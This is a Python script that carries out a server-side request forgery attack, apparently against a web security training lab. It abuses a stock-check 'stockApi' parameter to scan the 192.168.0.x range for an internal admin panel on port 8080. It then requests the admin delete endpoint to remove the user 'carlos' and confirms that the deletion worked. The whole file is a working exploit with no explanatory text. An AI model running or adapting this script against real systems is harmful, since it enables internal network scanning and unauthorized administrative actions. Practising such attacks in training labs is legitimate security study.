import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_admin_ip_address(url):
    check_stock_path = "/product/stock"
    for host in range(1,256):
        hostname = 'http://192.168.0.%s:8080/admin' %host
        parametes = {'stockApi': hostname}
        response = requests.post(
            url + check_stock_path,
            data=parametes,
            verify=False,
            proxies=proxies)
        if response.status_code == 200:
            admin_ip_address = '192.168.0.%s' %host
            return admin_ip_address
    raise ValueError("IP address not found.")

def is_delete_user_successful(url, admin_ip_address):
    delete_user_url_ssrf_payload = (
        "http://%s:8080/admin/delete?username=carlos" % admin_ip_address)
    check_stock_path = '/product/stock'
    params = {"stockApi": delete_user_url_ssrf_payload}
    response = requests.post(
        url + check_stock_path,
        data=params,
        verify=False,
        allow_redirects=False,
        proxies=proxies)
    return response.status_code == 302

def is_delete_user_check_successful(url, admin_ip_address):
    check_admin_url_ssrf_payload = (
        "http://%s:8080/admin" % admin_ip_address)
    check_stock_path = '/product/stock'
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    response = requests.post(
        url + check_stock_path,
        data=params2,
        verify=False,
        proxies=proxies)
    return 'User deleted successfully' in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Starting SSRF attack...")
        admin_ip_address = get_admin_ip_address(url)
        if not is_delete_user_successful(url, admin_ip_address):
            print("[-] Delete user was not successful.")
            sys.exit(FAIL)
        if not is_delete_user_check_successful(url, admin_ip_address):
            print("[-] Delete user check was not successful.")
            sys.exit(FAIL)
        print("[+] SSRF Attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SSRF attack was not successful.")
        sys.exit(FAIL) 